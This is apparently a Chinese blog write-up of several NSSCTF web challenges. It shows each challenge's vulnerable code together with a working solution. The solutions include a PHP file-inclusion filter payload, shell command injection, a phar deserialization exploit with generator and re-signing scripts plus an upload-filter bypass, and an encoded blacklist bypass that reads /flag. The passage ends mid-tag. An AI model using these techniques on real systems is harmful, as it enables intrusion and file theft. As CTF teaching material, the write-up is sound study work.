class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里就涉及到一个新的东西叫  <code>include_once</code></p><p><img src="../images/image-20230327211231920.png" alt="image-20230327211231920"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/cwd/index.php</span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-7-Team-ec-RCE"><a href="#NSSRound-7-Team-ec-RCE" class="headerlink" title="[NSSRound#7 Team]ec_RCE"></a>[NSSRound#7 Team]ec_RCE</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- A EZ RCE IN REALWORLD _ FROM CHINA.TW --&gt;</span><br><span class="line">&lt;!-- By 探姬 --&gt;</span><br><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>]))</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;LANG=zh_TW.utf8&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar <span class="subst">$action</span> <span class="subst">$data</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>就是靠个符号分隔符的含义</strong>      &amp;      &amp;&amp;     ||     ；</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=;&amp;data=<span class="string">&#x27;cat /flag&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-1-Basic-sql-by-sql"><a href="#NSSRound-1-Basic-sql-by-sql" class="headerlink" title="[NSSRound#1 Basic]sql_by_sql"></a>[NSSRound#1 Basic]sql_by_sql</h2><p><strong>考点</strong></p><p><img src="../images/image-20230327212719856.png" alt="image-20230327212719856"></p><p><img src="../images/image-20230327213330424.png" alt="image-20230327213330424"></p><p>源码给提示，就是给了注入点了，然后直接去注入就行了</p><p><a href="https://www.cnblogs.com/z2n3/p/16127279.html">这篇文章可以</a></p><p>就是对这道题讲解的非常详细</p><h2 id="NSSRound-4-SWPU-1zweb-revenge"><a href="#NSSRound-4-SWPU-1zweb-revenge" class="headerlink" title="[NSSRound#4 SWPU]1zweb(revenge)"></a>[NSSRound#4 SWPU]1zweb(revenge)</h2><p>考点</p><p><img src="../images/image-20230327213500110.png" alt="image-20230327213500110"></p><p>题目</p><p><img src="../images/image-20230327221113520.png" alt="image-20230327221113520"></p><p>这里就是给你查出源码，然后给你自己审计的过程</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的触发点就是<code>file_get_contents()</code>，这个会触发phar反序列化</p><p>那么这里的话就只需要绕过wakeup就行了</p><p><strong>生成phar文件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">LoveNss</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下面这部分就没改</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;poc.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>运行后会生成poc.phar</p><p>然后修改一下值来绕过wakeup(就是修改这个类里边属性的数量就行)</p><p>由于需要绕过wakeup，因为是后面自己去改的数据，而<code>phar</code>文件的签名是第一次生成文件的时候自动生成的，所以当我们修改数据过后，由于签名错误，这个<code>phar</code>是无法被正常解析的，所以需要修改签名，让他变成一个正常的phar文件还需要对phar文件进行修改 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"> </span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;poc.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read() <span class="comment"># 需要重新生成签名的phar文件</span></span><br><span class="line"> </span><br><span class="line">data = file[:-<span class="number">28</span>] <span class="comment"># 获取需要签名的数据</span></span><br><span class="line"> </span><br><span class="line">final = file[-<span class="number">8</span>:] <span class="comment"># 获取最后8位GBMB标识和签名类型</span></span><br><span class="line"> </span><br><span class="line">newfile = data+sha1(data).digest()+final <span class="comment"># 数据 + 签名 + 类型 + GBMB</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;newpoc.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(newfile) <span class="comment"># 写入到新的phar文件</span></span><br></pre></td></tr></table></figure><p>新生成的phar包后，我们就去查看一下文件上传的代码</p><p><strong>upload.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传异常&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)))&#123;</span><br><span class="line">        <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">gettype</span>(<span class="variable">$pos</span>)===<span class="string">&quot;integer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ltj一眼就发现了phar&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$content</span>);</span><br><span class="line">                <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;上传成功 ./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里对文件后后缀进行了白名单，也对phar文件内容进行了检测，伪了绕过这两点</p><p>将文件压缩为zip文件，并把后缀改为png文件，这样文件内容和后缀白名单检测都绕过了(可能就是解压成zip文件后，phar标志性的东西<code>__HALT_COMPILER();</code>就检测不到了)</p><p><strong>phar://伪协议</strong><br><strong>这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压，用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php 注意 PHP&gt;=5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。步骤：写一个一句话木马shell。php，然后用zip协议解压缩为shell.zip。然后将后缀改为png等其他格式</strong></p><p>这就是phar协议的内容，所以这里就是为什么要解压成zip文件的原因</p><p>这里然后压缩成zip文件后，修改后缀名为png</p><p><img src="../images/image-20230327223103174.png" alt="image-20230327223103174"></p><p>上传成功后，使用phar伪协议传参</p><p><img src="../images/image-20230327223343549.png" alt="image-20230327223343549"></p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=phar:<span class="comment">//./upload/123.png/newpoc.phar </span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-V-Team-PYRCE"><a href="#NSSRound-V-Team-PYRCE" class="headerlink" title="[NSSRound#V Team]PYRCE"></a>[NSSRound#V Team]PYRCE</h2><p>考点</p><p><img src="../images/image-20230327224532343.png" alt="image-20230327224532343"></p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;Ňśś&quot;</span>):</span><br><span class="line">        nss = request.args.get(<span class="string">&quot;Ňśś&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的代码就是很简陋，就是在/source那给了源码，然后在index函数发送请求并进行命令执行   ——-&gt;    <code>os.popen()</code></p><p>这里只要就是绕过黑名单的问题，写个脚本看看哪些没有被过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="built_in">print</span>(black)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> waf(<span class="built_in">chr</span>(i))):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        L.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="built_in">print</span>(L)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[&#x27;\x00&#x27;, &#x27;\x01&#x27;, &#x27;\x02&#x27;, &#x27;\x03&#x27;, &#x27;\x04&#x27;, &#x27;\x05&#x27;, &#x27;\x06&#x27;, &#x27;\x07&#x27;, &#x27;\x08&#x27;, &#x27;\t&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;\r&#x27;, &#x27;\x0e&#x27;, &#x27;\x0f&#x27;, &#x27;\x10&#x27;, &#x27;\x11&#x27;, &#x27;\x12&#x27;, &#x27;\x13&#x27;, &#x27;\x14&#x27;, &#x27;\x15&#x27;, &#x27;\x16&#x27;, &#x27;\x17&#x27;, &#x27;\x18&#x27;, &#x27;\x19&#x27;, &#x27;\x1a&#x27;, &#x27;\x1b&#x27;, &#x27;\x1c&#x27;, &#x27;\x1d&#x27;, &#x27;\x1e&#x27;, &#x27;\x1f&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;,&#x27;, &#x27;.&#x27;, &#x27;:&#x27;, &#x27;?&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;\x7f&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>和php的那个匹配脚本差不多，也是利用chr来写<br>选出常用的，包括<code>\t</code> <code>$</code> <code>&amp;</code> <code>()</code> <code>,</code> <code>.</code> <code>:</code> <code>?</code> 以及大小写字母（<code>过滤u n</code>)</p><p><strong>paylaod</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">cp%</span><span class="language-bash">09%24%28cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26echo%09%24%28pwd%29flag%29%09app%2Epy</span></span><br></pre></td></tr></table></figure><p><code>cp    $(cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;echo    $(pwd)flag)    app.py</code></p><p>就是利用shell里面的知识来写，$(xxx)这个里面会执行命令</p><p><img src="../images/image-20230328091657655.png" alt="image-20230328091657655"></p><p>然后这里前面给了flag在根目录了，然后这里就直接先cd返回到根目录，然后在使用pwd拿到/符号，因为此时已经cd到根目录了，对flag进行输出，然后使用cp命令将flag覆盖到app.py处，就是/source那里</p><h2 id="NSSRound-8-Basic-Upload-gogoggo"><a href="#NSSRound-8-Basic-Upload-gogoggo" class="headerlink" title="[NSSRound#8 Basic]Upload_gogoggo"></a>[NSSRound#8 Basic]Upload_gogoggo</h2><p>考点</p><p><img src="../images/image-20230328091957559.png" alt="image-20230328091957559"></p><p>题目</p><p><img src="../images/image-20230328092016055.png" alt="image-20230328092016055"></p><p><strong>golang的文件上传</strong>（属于是一个新的知识点)</p><p>这里的话go和php不同，他没有一句话木马，所以这里的话getshell是用</p><p>go run xx.go     xx.go文件里写的就是命令执行代码</p><p>例子代码</p><p>1.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    out, err := exec.Command(<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-l&quot;</span>).Output()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230328092748620.png" alt="image-20230328092748620"></p><p>运行成功</p><p>他这里是没有任何过滤的文件上传，所以就可以随便上点东西看看，这里上传了个1.php</p><p><img src="../images/image-20230328190306949.png" alt="image-20230328190306949"></p><p>不难发现，这里会执行命令<code>go 上传的文件名</code>，修改文件名为help试试</p><p><img src="../images/image-20230328190433293.png" 